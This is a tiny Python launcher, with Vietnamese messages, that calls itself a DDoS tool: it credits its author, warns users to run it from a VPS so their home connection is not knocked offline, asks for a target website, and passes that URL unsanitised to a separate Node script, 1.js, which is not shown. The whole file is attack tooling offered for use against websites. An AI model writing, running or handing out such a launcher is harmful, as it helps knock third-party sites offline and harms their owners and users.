import os
print("nên dùng trên vps không thì mạng nhà bạn sẽ đăng xuất!!!")
print("tool by dregoo !!!, cấm leak dưới mọi hình thức!!!!!")
print("tool ddos 30/4 - 1/5")
url=input("web 3/ cần ddos: ")
os.system(f'node 1.js {url}')
